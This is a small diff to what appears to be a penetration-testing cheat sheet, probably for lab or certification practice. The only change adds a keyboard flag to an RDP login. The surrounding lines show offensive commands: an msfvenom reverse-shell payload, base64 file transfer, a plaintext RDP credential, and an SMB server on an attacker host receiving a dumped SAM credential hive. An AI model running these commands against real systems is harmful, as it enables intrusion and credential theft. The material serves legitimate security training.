@@ -92,7 +92,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.240 LPORT=8080
 [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 echo "xxxxx" | base64 -d > hosts
 
-xfreerdp /u:Nathan /p:abc123// /v:192.168.124.59
+xfreerdp /u:Nathan /p:abc123// /v:192.168.124.59 /kbd:0x0000040CEAX
 
 python3 smbserver.py -smb2support CompData /home/kali/Desktop/tmp/mini/ddump
 move sam.save \\192.168.119.135\CompData
